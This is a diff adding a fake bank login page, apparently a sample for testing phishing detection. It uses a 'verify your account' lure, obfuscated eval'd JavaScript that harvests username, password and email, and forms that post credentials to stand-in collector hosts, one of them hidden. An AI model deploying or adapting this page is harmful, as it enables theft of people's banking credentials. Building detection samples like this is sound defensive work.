@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login - Verify Your Account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        
+        header {
+            background-color: #00529b;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            max-width: 400px;
+            margin: 40px auto;
+        }
+        
+        h1 {
+            margin-top: 0;
+            color: #00529b;
+            font-size: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        input[type="text"],
+        input[type="password"],
+        input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        
+        button {
+            background-color: #00529b;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+        
+        button:hover {
+            background-color: #003d73;
+        }
+        
+        .security-info {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .security-icon {
+            display: inline-block;
+            margin-right: 5px;
+        }
+        
+        footer {
+            background-color: #f0f0f0;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-top: 40px;
+        }
+        
+        /* Hidden elements for phishing detection */
+        .hidden-data {
+            display: none;
+            visibility: hidden;
+        }
+    </style>
+    <script>
+        // Obfuscated JavaScript (for phishing detection)
+        eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('4 3(){2 1=5.6("7");2 0=5.6("8");2 9=5.6("10");11.12("13",{1:1.14,0:0.14,15:9.14})}',10,16,'password|username|var|collectData|function|document|getElementById|username|password|email|email|window|localStorage|setItem|userData|email'.split('|'),0,{}));
+    </script>
+</head>
+<body>
+    <header>
+        <div class="logo">Legitimate Bank</div>
+    </header>
+    
+    <div class="container">
+        <div class="login-container">
+            <h1>Account Verification Required</h1>
+            <p>Due to a recent system upgrade, we need you to verify your account information.</p>
+            
+            <form action="https://malicious-server.example.com/collect" method="post" id="login-form">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                
+                <button type="button" onclick="collectData()">Verify Account</button>
+            </form>
+            
+            <div class="security-info">
+                <p><span class="security-icon">🔒</span> Secure verification process</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden iframe for data collection -->
+    <iframe src="about:blank" style="display:none;visibility:hidden" width="0" height="0"></iframe>
+    
+    <!-- Hidden form for data exfiltration -->
+    <div class="hidden-data">
+        <form id="exfil-form" action="https://data-collector.example.com/store" method="post">
+            <input type="hidden" name="collected_data" id="collected_data">
+        </form>
+    </div>
+    
+    <footer>
+        <p>&copy; 2023 Legitimate Bank. All rights reserved.</p>
+        <p>Legitimate Bank is a member of FDIC. Equal Housing Lender.</p>
+    </footer>
+</body>
+</html>
